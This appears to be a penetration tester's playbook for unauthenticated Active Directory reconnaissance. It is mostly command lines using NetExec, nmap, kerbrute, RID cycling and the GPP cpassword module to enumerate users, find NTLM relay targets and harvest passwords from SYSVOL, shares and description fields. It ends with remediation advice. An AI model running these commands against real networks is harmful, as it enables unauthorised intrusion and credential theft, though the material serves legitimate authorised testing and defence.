# Stage 0 — Unauthenticated Recon & Enumeration

Goal: map the domain, find low-hanging creds and usernames, identify SMB signing
(relay targets) — all before you have valid credentials.

## Host & service discovery
```bash
nxc smb 10.0.0.0/24                       # live hosts, OS, domain, SMB signing
nmap -sV -p 88,135,139,389,445,464,636,3268,5985 10.0.0.0/24  # DC fingerprint
nxc smb 10.0.0.0/24 --gen-relay-list relaytargets.txt  # hosts w/ SMB signing OFF
```
SMB signing **disabled** = valid NTLM relay target (note these now).

## Identify the domain controller(s)
```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
nxc smb <DC> --shares                     # confirm SYSVOL/NETLOGON
```

## Anonymous / null / guest access
```bash
nxc smb <DC> -u '' -p ''                   # null session
nxc smb <DC> -u guest -p ''                # guest
nxc smb <DC> -u '' -p '' --shares --users --pass-pol
nxc ldap <DC> -u '' -p '' --users          # anonymous LDAP bind
ldapsearch -x -H ldap://<DC> -b "DC=corp,DC=local"   # anon LDAP dump
enum4linux-ng -A <DC>
rpcclient -U '' -N <DC>                     # enumdomusers, querydispinfo
```

## User enumeration (no creds)
```bash
# Kerberos user enum (no lockout, quiet) — validates usernames
nxc smb <DC> -u users.txt -p '' -k        # or:
kerbrute userenum -d corp.local --dc <DC> users.txt
# RID cycling when null session allowed
nxc smb <DC> -u '' -p '' --rid-brute 10000
lookupsid.py corp.local/anonymous@<DC>
```
Build a username list from RID brute, LinkedIn/OSINT, and naming convention
(`first.last`, `flast`). Feed into spraying (`initial-access.md`).

## SYSVOL / GPP secrets (with any read access)
```bash
nxc smb <DC> -u user -p pass -M gpp_password        # cpassword in Groups.xml
nxc smb <DC> -u user -p pass -M gpp_autologin
# Manually: \\<DC>\SYSVOL\<domain>\Policies\...\Groups.xml  (AES key is public)
```
GPP `cpassword` is decryptable with a Microsoft-published key → instant creds.

## Other quick wins
```bash
nxc smb <DC> -u user -p pass --shares               # readable shares → creds/scripts
nxc smb <DC> -u user -p pass -M spider_plus         # crawl shares for secrets
nxc ldap <DC> -u user -p pass -M user-desc          # passwords in description field
nxc ldap <DC> -u user -p pass -M maq                # ms-DS-MachineAccountQuota (RBCD)
```
Check user `description`/`info` fields — admins still stash passwords there.

## What to record
- DCs, domain/forest name, functional level.
- Relay targets (signing off), lockout policy (threshold/window), password policy.
- Valid usernames, any creds found (GPP, shares, descriptions).
- ADCS presence (`nxc ldap <DC> -u u -p p -M adcs`), MSSQL, Exchange.

## Remediation to recommend
Disable anonymous/null LDAP & SMB; enforce SMB signing everywhere; remove GPP
cpassword and rotate affected creds; set `ms-DS-MachineAccountQuota` to 0; audit
`description`/`info` fields; restrict RID enumeration; monitor Kerberos
pre-auth failures for user-enum.
